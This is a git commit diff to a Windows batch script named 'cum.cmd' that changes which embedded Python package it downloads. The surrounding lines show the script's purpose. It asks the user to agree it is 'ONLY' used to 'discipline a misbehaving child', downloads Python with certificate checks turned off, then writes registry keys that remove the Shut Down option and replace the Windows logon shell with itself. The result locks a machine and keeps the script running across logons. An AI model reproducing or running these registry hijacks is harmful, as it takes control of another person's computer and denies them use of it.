c5949d513d2206b0a62d7f2e5923a25224f414df
imightexist <94249457+imightexist@users.noreply.github.com>
2026-08-22 16:12:48 -0500

    Update cum.cmd

--- cum.cmd
+++ cum.cmd
@@ -5,10 +5,10 @@ if "%1"=="skid" goto init
 echo press any key if you agree that you are ONLY doing this to discipline a misbehaving child...
 pause > nul
 if exist python goto python
-del python-3.8.10-embed-amd64.zip /q
-aria2c --check-certificate=false -x16 -m16 -s16 https://www.python.org/ftp/python/3.8.10/python-3.8.10-embed-amd64.zip
-7z x -aoa python-3.8.10-embed-amd64.zip -opython
-del /q python-3.8.10-embed-amd64.zip
+del python-3.8.10-embed-win32.zip /q
+aria2c --check-certificate=false -x16 -m16 -s16 https://www.python.org/ftp/python/3.8.10/python-3.8.10-embed-win32.zip
+7z x -aoa python-3.8.10-embed-win32.zip -opython
+del /q python-3.8.10-embed-win32.zip
 :python
 reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 1 /f
 reg add "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f /d "cmd /c cd /d %cd% && cum.cmd skid"
